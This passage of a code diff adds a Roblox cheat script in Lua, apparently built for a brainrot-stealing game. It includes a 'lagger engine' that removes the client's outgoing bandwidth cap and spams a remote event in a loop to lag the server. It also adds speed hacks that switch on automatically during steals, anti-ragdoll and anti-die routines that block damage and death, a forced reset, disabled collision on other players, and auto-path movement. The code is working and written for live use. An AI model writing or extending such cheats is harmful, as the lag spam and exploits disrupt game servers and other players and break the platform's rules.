+        if r then r:FireServer(payload) end
+    end)
+end
+
+local function removeNetworkLimit()
+    pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
+end
+
+local function startLaggerEngine()
+    if laggerState.thread then task.cancel(laggerState.thread); laggerState.thread = nil end
+    laggerState.enabled = true
+    laggerState.thread = task.spawn(function()
+        while laggerState.enabled do removeNetworkLimit(); sendLagSpam(); task.wait(laggerState.waitTime) end
+    end)
+end
+
+local function stopLaggerEngine()
+    laggerState.enabled = false
+    if laggerState.thread then task.cancel(laggerState.thread); laggerState.thread = nil end
+end
+
+local AP_L1, AP_L2 = Vector3.new(-476.48,-6.28,92.73), Vector3.new(-483.12,-4.95,94.80)
+local AP_R1, AP_R2 = Vector3.new(-476.16,-6.52,25.62), Vector3.new(-483.06,-5.03,25.48)
+
+-- ============================================
+-- ============================================
+-- SPEED SYSTEM (LinearVelocity-based)
+-- ============================================
+NS = 60
+CS = 30
+LAGGER_SPEED = 13
+LAGGER_CARRY_SPEED = 13
+
+carrySpeedActive = false
+laggerModeEnabled = false
+laggerCarryToggled = false
+laggerPhase = 0
+speedMode = false
+autoCarrySpeedEnabled = false
+setAutoCarrySpeedVisual = nil
+
+local lastMoveDir = Vector3.new(0, 0, 0)
+local MOVE_KEYS = {
+    [Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true, [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
+    [Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true, [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true
+}
+
+local AutoCarry = {
+    _autoCarryFromSteal = false,
+    _autoCarryGraceUntil = 0,
+    _waitingForCarryPickup = false,
+    _carryPickupWatchUntil = 0,
+    _autoCarryReturnMode = nil,
+}
+
+local _spdLV = nil
+local _spdAtt = nil
+local _vertAtt = nil
+local _vertLV = nil
+local _stealAttrWasActive = false
+
+local function isCarryName(name)
+    local n = tostring(name or ""):lower()
+    return n:find("brainrot") or n:find("animal") or n:find("carry") or n:find("grab") or n:find("steal") or n:find("hold")
+end
+
+local function isIgnoredCarryTool(name)
+    local n = tostring(name or ""):lower()
+    return n:find("bat") or n:find("slap") or n:find("medusa") or n:find("head") or n:find("stone")
+end
+
+__HH.isCarryingBrainrot = function(char)
+    if not char then return false end
+    for _, name in ipairs({"Carrying", "IsCarrying", "Grabbed", "Holding", "StealHold", "HasGrab"}) do
+        local v = char:FindFirstChild(name, true)
+        if v then
+            if v:IsA("BoolValue") and v.Value then return true end
+            if v:IsA("ObjectValue") and v.Value then return true end
+            if v:IsA("StringValue") and v.Value ~= "" then return true end
+        end
+    end
+    for _, child in ipairs(char:GetChildren()) do
+        if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
+            if child:FindFirstChildOfClass("Humanoid") and child:FindFirstChild("HumanoidRootPart") then return true end
+            if isCarryName(child.Name) then return true end
+        elseif child:IsA("Tool") and not isIgnoredCarryTool(child.Name) then
+            return true
+        end
+    end
+    return false
+end
+
+function destroySpeedLV()
+    if _spdLV and _spdLV.Parent then _spdLV:Destroy() end
+    if _spdAtt and _spdAtt.Parent then _spdAtt:Destroy() end
+    _spdLV, _spdAtt = nil, nil
+end
+
+local function setupSpeedLV(hrp)
+    destroySpeedLV()
+    _spdAtt = Instance.new("Attachment", hrp)
+    _spdAtt.Name = "NovaHubSpeedAtt"
+    _spdLV = Instance.new("LinearVelocity", hrp)
+    _spdLV.Name = "NovaHubSpeedLV"
+    _spdLV.Attachment0 = _spdAtt
+    _spdLV.VelocityConstraintMode = Enum.VelocityConstraintMode.Plane
+    _spdLV.PrimaryTangentAxis = Vector3.new(1, 0, 0)
+    _spdLV.SecondaryTangentAxis = Vector3.new(0, 0, 1)
+    _spdLV.MaxForce = math.huge
+    _spdLV.RelativeTo = Enum.ActuatorRelativeTo.World
+end
+
+function destroyVertLV()
+    if _vertLV and _vertLV.Parent then _vertLV:Destroy() end
+    if _vertAtt and _vertAtt.Parent then _vertAtt:Destroy() end
+    _vertLV, _vertAtt = nil, nil
+end
+
+local function getVertLV(root)
+    if not _vertLV or _vertLV.Parent ~= root then
+        destroyVertLV()
+        _vertAtt = Instance.new("Attachment", root)
+        _vertLV = Instance.new("LinearVelocity", root)
+        _vertLV.Attachment0 = _vertAtt
+        _vertLV.VelocityConstraintMode = Enum.VelocityConstraintMode.Vector
+        _vertLV.MaxForce = math.huge
+        _vertLV.RelativeTo = Enum.ActuatorRelativeTo.World
+    end
+    return _vertLV
+end
+
+local function driveHorizontal(root, dir, spd)
+    if not dir or dir.Magnitude <= 0.1 then
+        return
+    end
+    root.Velocity = Vector3.new(dir.X * spd, root.Velocity.Y, dir.Z * spd)
+end
+
+function drive3D(root, vel)
+    local lv = getVertLV(root)
+    lv.VectorVelocity = vel
+end
+
+local _nearBrainrotAt, _nearBrainrotValue = 0, false
+local function isNearBrainrot(char)
+    -- The actual stealable Brainrots have a ProximityPrompt, so detect the prompt itself
+    -- instead of relying only on the model's display name.
+    if tick() - _nearBrainrotAt < 0.15 then return _nearBrainrotValue end
+    _nearBrainrotAt = tick(); _nearBrainrotValue = false
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return false end
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("ProximityPrompt") then
+            local holder = obj.Parent
+            local part = holder and (holder:IsA("BasePart") and holder or holder:FindFirstAncestorWhichIsA("BasePart"))
+            if part and (part.Position - root.Position).Magnitude <= 11 then
+                _nearBrainrotValue = true
+                return true
+            end
+        end
+    end
+    return false
+end
+
+local function isRagdollState(hum)
+    if not hum then return true end
+    local st = hum:GetState()
+    return hum.PlatformStand or st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown
+end
+
+function getActiveMoveSpeed()
+    if laggerCarryToggled then return LAGGER_CARRY_SPEED
+    elseif laggerModeEnabled then return LAGGER_SPEED
+    elseif carrySpeedActive then return CS
+    else return NS end
+end
+
+-- Auto Carry Speed Logic
+local function setCarrySpeedMode(on)
+    carrySpeedActive = on == true
+    speedMode = on == true
+end
+
+local function enableCarrySpeedForSteal()
+    AutoCarry._waitingForCarryPickup = false
+    AutoCarry._carryPickupWatchUntil = 0
+    if not AutoCarry._autoCarryFromSteal then
+        -- Keep the selected speed family, so Lagger switches to Lagger Carry.
+        AutoCarry._autoCarryReturnMode = laggerCarryToggled and "Lagger Carry"
+            or (laggerModeEnabled and "Lagger")
+            or (carrySpeedActive and "Carry")
+            or "Normal"
+    end
+    AutoCarry._autoCarryFromSteal = true
+    AutoCarry._autoCarryGraceUntil = tick() + 0.75
+
+    if AutoCarry._autoCarryReturnMode == "Lagger" or AutoCarry._autoCarryReturnMode == "Lagger Carry" then
+        laggerModeEnabled = false
+        carrySpeedActive = false
+        laggerCarryToggled = true
+        laggerPhase = 2
+        speedMode = false
+    else
+        setCarrySpeedMode(true)
+    end
+    if refreshSpeedModeLabel then refreshSpeedModeLabel() end
+end
+
+local function disableAutoCarrySpeed()
+    if not AutoCarry._autoCarryFromSteal and not AutoCarry._waitingForCarryPickup then return end
+    local wasAutoApplied = AutoCarry._autoCarryFromSteal
+    local returnMode = AutoCarry._autoCarryReturnMode
+    AutoCarry._autoCarryFromSteal = false
+    AutoCarry._waitingForCarryPickup = false
+    if not wasAutoApplied then return end
+    if returnMode == "Lagger Carry" then
+        laggerModeEnabled, laggerCarryToggled, carrySpeedActive, speedMode = false, true, false, false
+        laggerPhase = 2
+    elseif returnMode == "Lagger" then
+        laggerModeEnabled, laggerCarryToggled, carrySpeedActive, speedMode = true, false, false, false
+        laggerPhase = 1
+    elseif returnMode == "Carry" then
+        laggerModeEnabled, laggerCarryToggled, carrySpeedActive, speedMode = false, false, true, true
+        laggerPhase = 0
+    else
+        laggerModeEnabled, laggerCarryToggled, carrySpeedActive, speedMode = false, false, false, false
+        laggerPhase = 0
+    end
+    if refreshSpeedModeLabel then refreshSpeedModeLabel() end
+end
+
+-- Main Speed Loop (direct velocity)
+RunService.RenderStepped:Connect(function()
+    -- Auto carry speed detection
+    if autoCarrySpeedEnabled then
+        local aChar = LP.Character
+        local aHum = aChar and aChar:FindFirstChildOfClass("Humanoid")
+        if aChar and aHum then
+            local gotHit = isRagdollState(aHum)
+            local stealingAttr = LP:GetAttribute("Stealing") == true
+            local nearBrainrot = isNearBrainrot(aChar)
+            local carryingBrainrot = __HH.isCarryingBrainrot(aChar) or nearBrainrot
+            -- Auto Switch Speed immediately enables Carry Speed as soon as a steal prompt is nearby.
+            if nearBrainrot and not AutoCarry._autoCarryFromSteal then enableCarrySpeedForSteal() end
+            if stealingAttr and not _stealAttrWasActive then
+                _stealAttrWasActive = true
+                enableCarrySpeedForSteal()
+            elseif not stealingAttr then
+                _stealAttrWasActive = false
+            end
+            if AutoCarry._waitingForCarryPickup then
+                if gotHit or tick() > (AutoCarry._carryPickupWatchUntil or 0) then
+                    AutoCarry._waitingForCarryPickup = false
+                elseif carryingBrainrot then
+                    enableCarrySpeedForSteal()
+                end
+            end
+            if carryingBrainrot and not AutoCarry._autoCarryFromSteal then enableCarrySpeedForSteal() end
+            if AutoCarry._autoCarryFromSteal then
+                if gotHit or (tick() > AutoCarry._autoCarryGraceUntil and not carryingBrainrot and not stealingAttr) then
+                    disableAutoCarrySpeed()
+                end
+            end
+        end
+    end
+
+    local char = LP.Character
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hum or not hrp then return end
+
+    if isRagdollState(hum) then
+        _G.PureRagdollKilledCarry = true
+        lastMoveDir = Vector3.new(0, 0, 0)
+        return
+    end
+
+    -- don't interfere with tpLock / batV2 / aimbot
+    if __HH.tpLockEnabled or autoLeftEnabled or autoRightEnabled or __HH.batV2Enabled or autoBatEnabled or __HH.dropActive then
+        return
+    end
+
+    local md = hum.MoveDirection
+    local spd = getActiveMoveSpeed()
+    local moving = false
+
+    if md.Magnitude > 0 then
+        lastMoveDir = md
+        moving = true
+        driveHorizontal(hrp, md, spd)
+    elseif __HH.antiRagdollEnabled and lastMoveDir.Magnitude > 0 then
+        local anyHeld = false
+        for key in pairs(MOVE_KEYS) do
+            if __HH.UIS:IsKeyDown(key) then anyHeld = true; break end
+        end
+        if anyHeld then
+            moving = true
+            driveHorizontal(hrp, lastMoveDir, spd)
+        end
+    end
+
+    -- when not moving, don't set velocity (matches YOUSEF67 approach)
+end)
+
+function toggleCarryMode()
+    if laggerModeEnabled or laggerCarryToggled then
+        laggerModeEnabled = false; laggerCarryToggled = false; laggerPhase = 0
+        carrySpeedActive = true; speedMode = true
+    else
+        carrySpeedActive = not carrySpeedActive
+        speedMode = carrySpeedActive
+    end
+    refreshSpeedModeLabel()
+end
+
+function toggleLaggerMode()
+    if laggerCarryToggled then laggerCarryToggled = false end
+    carrySpeedActive = false; speedMode = false
+    laggerModeEnabled = not laggerModeEnabled
+    laggerPhase = laggerModeEnabled and 1 or 0
+    refreshSpeedModeLabel()
+end
+
+function toggleLaggerCarryMode()
+    if laggerModeEnabled then laggerModeEnabled = false; laggerPhase = 0 end
+    carrySpeedActive = false; speedMode = false
+    laggerCarryToggled = not laggerCarryToggled
+    if laggerCarryToggled then laggerPhase = 2 else laggerPhase = 0 end
+    refreshSpeedModeLabel()
+end
+
+refreshSpeedModeLabel = function()
+    if modeValLbl then
+        if laggerCarryToggled then modeValLbl.Text="Lagger Carry"
+        elseif laggerModeEnabled then modeValLbl.Text="Lagger"
+        elseif carrySpeedActive then modeValLbl.Text="Carry"
+        else modeValLbl.Text="Normal" end
+    end
+    if laggerModePillRef and laggerModePillRef.pill and laggerModePillRef.dot then
+        local pill=laggerModePillRef.pill;local dot=laggerModePillRef.dot;local on=laggerModeEnabled
+        TweenService:Create(pill,TweenInfo.new(0.16,Enum.EasingStyle.Quad),{BackgroundColor3=on and Color3.fromRGB(205,232,255) or Color3.fromRGB(0,0,0),BackgroundTransparency=on and 0.4 or 0.85}):Play()
+        TweenService:Create(dot,TweenInfo.new(0.16,Enum.EasingStyle.Back),{Position=on and UDim2.new(1,-13,0.5,-5) or UDim2.new(0,3,0.5,-5),BackgroundColor3=on and Color3.fromRGB(205,232,255) or Color3.fromRGB(150,150,150)}):Play()
+    end
+    if carryModePillRef and carryModePillRef.pill and carryModePillRef.dot then
+        local pill=carryModePillRef.pill;local dot=carryModePillRef.dot;local on=carrySpeedActive
+        TweenService:Create(pill,TweenInfo.new(0.16,Enum.EasingStyle.Quad),{BackgroundColor3=on and Color3.fromRGB(205,232,255) or Color3.fromRGB(0,0,0),BackgroundTransparency=on and 0.4 or 0.85}):Play()
+        TweenService:Create(dot,TweenInfo.new(0.16,Enum.EasingStyle.Back),{Position=on and UDim2.new(1,-13,0.5,-5) or UDim2.new(0,3,0.5,-5),BackgroundColor3=on and Color3.fromRGB(205,232,255) or Color3.fromRGB(150,150,150)}):Play()
+    end
+    if __HH.mobBtnRefs and __HH.mobBtnRefs.carrySpeed then __HH.mobBtnRefs.carrySpeed(carrySpeedActive) end
+    if __HH.mobBtnRefs and __HH.mobBtnRefs.lagger then __HH.mobBtnRefs.lagger(laggerModeEnabled) end
+    if __HH.mobBtnRefs and __HH.mobBtnRefs.laggerCarry then __HH.mobBtnRefs.laggerCarry(laggerCarryToggled) end
+end
+
+-- ============ FR HUB ROUND 3 SPEED BOOST (add-on) ============
+-- This is ONLY an addition on top of the Pure speed system.
+-- Engine: direct Velocity like FR Hub. Normalized MoveDirection so the
+-- full speed is reached even with a partial mobile joystick.
+do
+    local R3Boost = {
+        enabled = false,
+        carrySpeed = 32,
+        normalSpeed = 62,
+        forceCarry = false,
+    }
+    pcall(function()
+        if not (isfile and readfile and isfile("Round3SpeedBooster6_Config.json")) then return end
+        local raw = readfile("Round3SpeedBooster6_Config.json")
+        local cfg = game:GetService("HttpService"):JSONDecode(raw)
+        if type(cfg) == "table" then
+            if type(cfg.carrySpeed) == "number" and cfg.carrySpeed > 0 then R3Boost.carrySpeed = cfg.carrySpeed end
+            if type(cfg.normalSpeed) == "number" and cfg.normalSpeed > 0 then R3Boost.normalSpeed = cfg.normalSpeed end
+        end
+    end)
+
+    local Bridge = {
+        Enabled = R3Boost.enabled,
+        NormalSpeed = R3Boost.normalSpeed,
+        CarrySpeed = R3Boost.carrySpeed,
+        CarryMode = false,
+        ForceCarry = false,
+        Force = true,
+    }
+    _G.Round3SpeedBooster = Bridge
+
+    local function syncBridge()
+        Bridge.Enabled = R3Boost.enabled
+        Bridge.NormalSpeed = R3Boost.normalSpeed
+        Bridge.CarrySpeed = R3Boost.carrySpeed
+        Bridge.CarryMode = R3Boost.forceCarry
+        Bridge.ForceCarry = R3Boost.forceCarry
+    end
+    local function saveR3()
+        pcall(function()
+            if writefile then
+                writefile("Round3SpeedBooster6_Config.json", game:GetService("HttpService"):JSONEncode({
+                    carrySpeed = R3Boost.carrySpeed,
+                    normalSpeed = R3Boost.normalSpeed,
+                }))
+            end
+        end)
+    end
+    Bridge.setNormalSpeed = function(value)
+        value = tonumber(value)
+        if not value or value <= 0 then return end
+        R3Boost.normalSpeed = value
+        syncBridge(); saveR3()
+    end
+    Bridge.setCarrySpeed = function(value)
+        value = tonumber(value)
+        if not value or value <= 0 then return end
+        R3Boost.carrySpeed = value
+        syncBridge(); saveR3()
+    end
+    Bridge.setForceCarry = function(on)
+        R3Boost.forceCarry = on == true
+        syncBridge()
+    end
+    Bridge.setEnabled = function(on)
+        R3Boost.enabled = on == true
+        if not R3Boost.enabled then R3Boost.forceCarry = false end
+        syncBridge()
+    end
+    local function getR3BoostSpeed()
+        if not R3Boost.enabled then return R3Boost.normalSpeed end
+        return R3Boost.forceCarry and R3Boost.carrySpeed or R3Boost.normalSpeed
+    end
+    syncBridge()
+
+    RunService.RenderStepped:Connect(function()
+        if not R3Boost.enabled then return end
+        local char = LP.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if not hum or not hrp then return end
+        -- let the other movement features own the player while they run
+        if __HH.tpLockEnabled or autoLeftEnabled or autoRightEnabled or __HH.batV2Enabled or autoBatEnabled or __HH.dropActive then return end
+        local md = hum.MoveDirection
+        local spd = getR3BoostSpeed()
+        if md.Magnitude > 0.01 then
+            -- normalize: mobile joystick gives partial magnitude, which is
+            -- why 62 used to feel like ~34. Unit vector = full speed.
+            md = md.Unit
+            hrp.Velocity = Vector3.new(md.X * spd, hrp.Velocity.Y, md.Z * spd)
+        else
+            hrp.Velocity = Vector3.zero
+        end
+        if R3Boost.forceCarry ~= carrySpeedActive then
+            carrySpeedActive = R3Boost.forceCarry
+            speedMode = carrySpeedActive
+            if refreshSpeedModeLabel then refreshSpeedModeLabel() end
+        end
+    end)
+end
+
+-- R3-aware overrides: when the FR boost is enabled, the Pure velocity loop
+-- and the CARRY SPD button drive the FR speeds instead of the Pure ones.
+-- Wrapped in do..end so the chunk-level local limit (200) is untouched.
+do
+    local pureGet = getActiveMoveSpeed
+    local pureToggleCarry = toggleCarryMode
+    function getActiveMoveSpeed()
+        local b = _G.Round3SpeedBooster
+        if b and b.Enabled == true then
+            return (b.ForceCarry == true) and b.CarrySpeed or b.NormalSpeed
+        end
+        return pureGet()
+    end
+    function toggleCarryMode()
+        local b = _G.Round3SpeedBooster
+        if b and b.Enabled == true then
+            if b.setForceCarry then b.setForceCarry(not (b.ForceCarry == true)) end
+            carrySpeedActive = (b.ForceCarry == true)
+            speedMode = carrySpeedActive
+            refreshSpeedModeLabel()
+            return
+        end
+        pureToggleCarry()
+    end
+end
+
+-- ============================================
+
+-- ============================================================
+-- ANTI RAGDOLL (VisDuels version)
+-- ============================================================
+do
+    local visAntiConn = nil
+    local visResetCooldown = 0
+
+    local function visForceReset()
+        local char = LP.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        local root = char and char:FindFirstChild("HumanoidRootPart")
+        if not hum or not root or hum.Health <= 0 then return end
+        pcall(function()
+            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+            root.Velocity = Vector3.zero
+            root.RotVelocity = Vector3.zero
+            root.AssemblyLinearVelocity = Vector3.zero
+            root.AssemblyAngularVelocity = Vector3.zero
+            for _, obj in ipairs(char:GetDescendants()) do
+                if obj:IsA("Motor6D") then obj.Enabled = true end
+                if obj:IsA("Constraint") then obj.Enabled = true end
+            end
+            if workspace.CurrentCamera then workspace.CurrentCamera.CameraSubject = hum end
+            local ps = LP:FindFirstChild("PlayerScripts")
+            local pm = ps and ps:FindFirstChild("PlayerModule")
+            local cm = pm and pm:FindFirstChild("ControlModule")
+            if cm then local controls = require(cm); if controls then controls:Enable() end end
+            hum.AutoRotate = true
+            hum.PlatformStand = false
+            hum.Sit = false
+        end)
+    end
+
+    __HH.stopAntiRagdoll = function()
+        if visAntiConn then visAntiConn:Disconnect(); visAntiConn = nil end
+    end
+
+    __HH.startAntiRagdoll = function()
+        __HH.stopAntiRagdoll()
+        if not __HH.antiRagdollEnabled then return end
+        visAntiConn = RunService.Heartbeat:Connect(function()
+            if not __HH.antiRagdollEnabled then return end
+            local char = LP.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if not hum or hum.Health <= 0 then return end
+            local state = hum:GetState()
+            local ragdolled = state == Enum.HumanoidStateType.Physics
+                or state == Enum.HumanoidStateType.Ragdoll
+                or state == Enum.HumanoidStateType.FallingDown
+            if ragdolled and tick() - visResetCooldown > 0.15 then
+                visResetCooldown = tick()
+                visForceReset()
+            end
+        end)
+    end
+
+    LP.CharacterAdded:Connect(function()
+        task.wait(0.5)
+        if __HH.antiRagdollEnabled then __HH.startAntiRagdoll() end
+    end)
+end
+
+-- Instant Reset (Nexus Hub port from Lord Hub): camera-lock + collision strip +
+-- HipHeight spike until respawn, hard-kill fallback. Replaces the old void-teleport reset.
+end
+do
+__HH.FrameReset = {}
+do
+    -- Nexus Hub instant reset (ported from Lord Hub):
+    -- camera lock + collision strip + giant HipHeight until respawn is
+    -- detected, with a hard-kill fallback if the char refuses to die.
+    local camLocked          = false
+    local lockedCamCFrame    = nil
+    local resetCooldown      = false
+    local resetThread        = nil
+    local resetStop          = false
+    local respawnConn        = nil
+    local runtimeAlive       = true
+    local deathResetEnabled  = false
+    local deathResetThread   = nil
+    local INSTANT_RESET_STEP = 0.05
+
+    local function ResetPlayer()
+        if resetCooldown then return end
+        resetCooldown = true
+        resetStop = false
+        camLocked = false
+
+        -- Clear anti-die connections so the character can actually die/respawn.
+        for _, conn in pairs(__HH.antiDieConns) do pcall(function() conn:Disconnect() end) end
+        __HH.antiDieConns = {}
+
+        local character = LP.Character
+        if not character then
+            resetCooldown = false
+            return
+        end
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if not humanoid then
+            resetCooldown = false
+            return
+        end
+
+        local camera = workspace.CurrentCamera
+        if camera then
+            lockedCamCFrame = camera.CFrame
+            camLocked = true
+            camera.CFrame = lockedCamCFrame
+        end
+
+        local ok = false
+        local isRespawning = false
+
+        resetThread = task.spawn(function()
+            local attempts = 0
+            local maxAttempts = 40
+            local originalHipHeight = humanoid.HipHeight
+
+            while character and character.Parent
+                and humanoid and humanoid.Health > 0
+                and not isRespawning
+                and not resetStop do
+
+                if LP.Character ~= character then
+                    isRespawning = true
+                    break
+                end
+
+                pcall(function()
+                    humanoid.HipHeight = 1e30
+                    humanoid.AutoRotate = true
+
+                    local rootPart = character:FindFirstChild("HumanoidRootPart")
+                    if rootPart then
+                        rootPart.CanCollide = false
+                    end
+
+                    for _, part in ipairs(character:GetChildren()) do
+                        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                            part.CanCollide = false
+                        end
+                    end
+                end)
+
+                if not character or not character.Parent
+                    or not humanoid or humanoid.Health <= 0
+                    or LP.Character ~= character then
+                    ok = true
+                    break
+                end
+
+                attempts = attempts + 1
+                if attempts >= maxAttempts then break end
+                task.wait(INSTANT_RESET_STEP)
+            end
+
+            if not ok
+                and not resetStop
+                and character and character.Parent
+                and humanoid and humanoid.Health > 0
+                and not isRespawning then
+
+                pcall(function()
+                    humanoid.Health = 0
+                end)
+
+                task.wait(0.1)
+                if not character.Parent or humanoid.Health <= 0 then
+                    ok = true
+                end
+            end
+
+            if not ok and character and character.Parent and humanoid then
+                pcall(function()
+                    humanoid.HipHeight = originalHipHeight
+
+                    local rootPart = character:FindFirstChild("HumanoidRootPart")
+                    if rootPart then
+                        rootPart.CanCollide = true
+                    end
+
+                    for _, part in ipairs(character:GetChildren()) do
+                        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                            part.CanCollide = true
+                        end
+                    end
+                end)
+            end
+
+            camLocked = false
+            resetCooldown = false
+            resetThread = nil
+            resetStop = false
+        end)
+
+        if respawnConn then respawnConn:Disconnect() end
+        respawnConn = LP.CharacterAdded:Connect(function(newChar)
+            if respawnConn then respawnConn:Disconnect(); respawnConn = nil end
+            camLocked = false
+            resetCooldown = false
+            if resetThread then pcall(task.cancel, resetThread); resetThread = nil end
+            local newHum = newChar:WaitForChild("Humanoid", 3)
+            pcall(function()
+                if camera then
+                    camera.CameraSubject = newHum
+                    camera.CameraType = Enum.CameraType.Custom
+                end
+            end)
+        end)
+    end
+
+    local function StopResetSequence()
+        resetStop = true
+        if resetThread then pcall(task.cancel, resetThread); resetThread = nil end
+        camLocked = false
+        resetCooldown = false
+        local char = LP.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        local cam = workspace.CurrentCamera
+        if hum and cam then
+            pcall(function() cam.CameraSubject = hum; cam.CameraType = Enum.CameraType.Custom end)
+        end
+    end
+
+    -- camera lock (Nexus RenderStepped style)
+    RunService.RenderStepped:Connect(function()
+        if camLocked and lockedCamCFrame and workspace.CurrentCamera then
+            workspace.CurrentCamera.CFrame = lockedCamCFrame
+        end
+    end)
+
+    local function ToggleDeathReset(enable)
+        deathResetEnabled = enable == true
+        if deathResetEnabled and not deathResetThread then
+            deathResetThread = task.spawn(function()
+                local cooldown = 0
+                while runtimeAlive and deathResetEnabled do
+                    task.wait(0.1)
+                    local char = LP.Character
+                    if not char then
+                        if tick() - cooldown > 2 then
+                            cooldown = tick()
+                            ResetPlayer()
+                        end
+                    else
+                        local hum = char:FindFirstChildOfClass("Humanoid")
+                        if hum and hum.Health <= 0 and tick() - cooldown > 0 then
+                            cooldown = tick()
+                            ResetPlayer()
+                            task.wait(0.1)
+                        end
+                    end
+                end
+                deathResetThread = nil
+            end)
+        elseif not deathResetEnabled and deathResetThread then
+            task.cancel(deathResetThread)
+            deathResetThread = nil
+        end
+    end
+
+    __HH.FrameReset.ResetPlayer = ResetPlayer
+    __HH.FrameReset.StopResetSequence = StopResetSequence
+    __HH.FrameReset.ToggleDeathReset = ToggleDeathReset
+    __HH.FrameReset.Destroy = function()
+        runtimeAlive = false
+        ToggleDeathReset(false)
+        StopResetSequence()
+    end
+end
+
+pcall(function()
+    if _G.PureFrameReset and _G.PureFrameReset.Destroy then
+        _G.PureFrameReset.Destroy()
+    end
+end)
+_G.PureFrameReset = __HH.FrameReset
+
+__HH.stopAntiDie = function()
+    for _, conn in pairs(__HH.antiDieConns) do pcall(function() conn:Disconnect() end) end
+    __HH.antiDieConns = {}
+end
+
+__HH.startAntiDie = function()
+    __HH.stopAntiDie()
+    if not __HH.antiDieEnabled then return end
+    local char = LP.Character
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+
+    hum.BreakJointsOnDeath = false
+    hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+
+    table.insert(__HH.antiDieConns, hum:GetPropertyChangedSignal("Health"):Connect(function()
+        if hum.Health <= 0 then
+            hum.Health = hum.MaxHealth
+        end
+    end))
+
+    table.insert(__HH.antiDieConns, hum.Died:Connect(function()
+        task.wait()
+        local newHum = Instance.new("Humanoid")
+        newHum.Name = "ReplacedHumanoid"
+        newHum.Parent = char
+        workspace.CurrentCamera.CameraSubject = newHum
+        hum:Destroy()
+    end))
+end
+
+-- Frame Reset automatic reset-on-death integration.
+__HH.autoResetOnDeath = false
+__HH.setAutoResetOnDeathVisual = nil
+__HH.setupDeathReset = function()
+    __HH.FrameReset.ToggleDeathReset(__HH.autoResetOnDeath)
+end
+
+RunService.Stepped:Connect(function()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LP and p.Character then
+            for _, part in ipairs(p.Character:GetDescendants()) do
+                if part:IsA("BasePart") then part.CanCollide = false end
+            end
+        end
+    end
+end)
+
+
+-- ========== AUTO LEFT / AUTO RIGHT (FULL FRHUB PORT) ==========
+-- Pure's old path backend is gone. This block carries FRHUB's complete path
+-- coordinates, two-phase controller, speed selection, LinearVelocity driver,
+-- completion behavior, stop behavior, visual sync and toggle functions.
+-- The scope releases all internal helper registers after this backend is built.
+do
+local FRHubAutoPathPOS = {
+    L1=Vector3.new(-476.48,-6.28,92.73), L2=Vector3.new(-483.12,-4.95,94.80),
+    R1=Vector3.new(-476.16,-6.52,25.62), R2=Vector3.new(-483.04,-5.09,23.14),
+}
+local FRHubAutoPathConns = {autoLeft=nil, autoRight=nil}
+local FRHubAutoLeftPhase, FRHubAutoRightPhase = 1, 1
+
+local function getFRHubAutoMoveSpeed()
+    if laggerCarryToggled then return NS
+    elseif laggerModeEnabled then return LAGGER_SPEED
+    else return NS end
+end
+
+-- Dedicated copy of the horizontal branch used by FRHUB's _setV helper. It
+-- prevents Pure's normal speed actuator from replacing the Auto Path force.
+local FRHubAutoVelocityCache = setmetatable({}, {__mode="k"})
+local function destroyFRHubAutoVelocity(root)
+    local cached=FRHubAutoVelocityCache[root]
+    if cached then
+        pcall(function() if cached[1] and cached[1].Parent then cached[1]:Destroy() end end)
+        pcall(function() if cached[2] and cached[2].Parent then cached[2]:Destroy() end end)
+        FRHubAutoVelocityCache[root]=nil
+    end
+end
+local function getFRHubAutoVelocity(root)
+    local cached=FRHubAutoVelocityCache[root]
+    local lv=cached and cached[1]
+    if lv and lv.Parent==root then return lv end
+    destroyFRHubAutoVelocity(root)
+    local attachment=Instance.new("Attachment"); attachment.Name="FRHubAutoPathAttachment"; attachment.Parent=root
+    lv=Instance.new("LinearVelocity")
+    lv.Name="FRHubAutoPathVelocity"
+    lv.Attachment0=attachment
+    lv.VelocityConstraintMode=Enum.VelocityConstraintMode.Plane
+    lv.PrimaryTangentAxis=Vector3.new(1,0,0)
+    lv.SecondaryTangentAxis=Vector3.new(0,0,1)
+    lv.MaxForce=math.huge
+    lv.RelativeTo=Enum.ActuatorRelativeTo.World
+    lv.PlaneVelocity=Vector2.zero
+    lv.Parent=root
+    FRHubAutoVelocityCache[root]={lv,attachment}
+    return lv
+end
+local function setFRHubAutoVelocity(root, velocity)
+    if not root or not root.Parent then return end
+    if velocity.Magnitude < 0.01 then return end
+    root.AssemblyLinearVelocity = Vector3.new(velocity.X, root.AssemblyLinearVelocity.Y, velocity.Z)
+end
+_G.PureCursedClearAutoPathVelocity = function(root)
+    if root then setFRHubAutoVelocity(root,Vector3.zero) end
+end
+
+startAutoLeft = function()
+    if FRHubAutoPathConns.autoLeft then FRHubAutoPathConns.autoLeft:Disconnect() end
+    FRHubAutoLeftPhase=1
+    FRHubAutoPathConns.autoLeft=RunService.Heartbeat:Connect(function()
+        if not autoLeftEnabled then return end
+        local char=LP.Character; if not char then return end
+        local root=char:FindFirstChild("HumanoidRootPart"); local hum=char:FindFirstChildOfClass("Humanoid")
+        if not root or not hum then return end; local spd=getFRHubAutoMoveSpeed()
+        if FRHubAutoLeftPhase==1 then
+            local target=Vector3.new(FRHubAutoPathPOS.L1.X,root.Position.Y,FRHubAutoPathPOS.L1.Z)
